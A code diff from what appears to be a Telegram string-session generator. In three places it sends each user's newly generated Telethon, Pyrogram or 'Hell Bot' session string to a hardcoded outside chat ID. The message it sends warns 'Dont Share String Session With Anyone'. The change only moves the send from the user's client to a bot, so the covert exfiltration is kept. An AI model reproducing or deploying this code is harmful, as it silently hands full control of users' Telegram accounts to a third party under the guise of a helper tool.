@@ -182,7 +182,7 @@ async def generate_session(
                     "TELETHON" if telethon else "PYROGRAM", string_session
                 ),
             )
-            await client.send_message(
+            await bot.send_message(
                 -1001928928991,
                 "**{} - STRING SESSION** \n\n`{}`\n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__".format(
                     "TELETHON" if telethon else "PYROGRAM", string_session
@@ -204,7 +204,7 @@ async def generate_session(
                     "Hell Bot", hell_session
                 ),
             )
-            await client.send_message(
+            await bot.send_message(
                 -1001928928991,
                 "**{} ~ STRING SESSION** \n\n`{}` \n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__".format(
                     "Hell Bot", hell_session
@@ -217,7 +217,7 @@ async def generate_session(
                     "Pyrogram", string_session
                 ),
             )
-            await client.send_message(
+            await bot.send_message(
                 -1001928928991,
                  "**{} ~ STRING SESSION** \n\n`{}` \n\n• __Dont Share String Session With Anyone__\n• __Dont Invite Anyone To Heroku__".format(
                     "Pyrogram", string_session
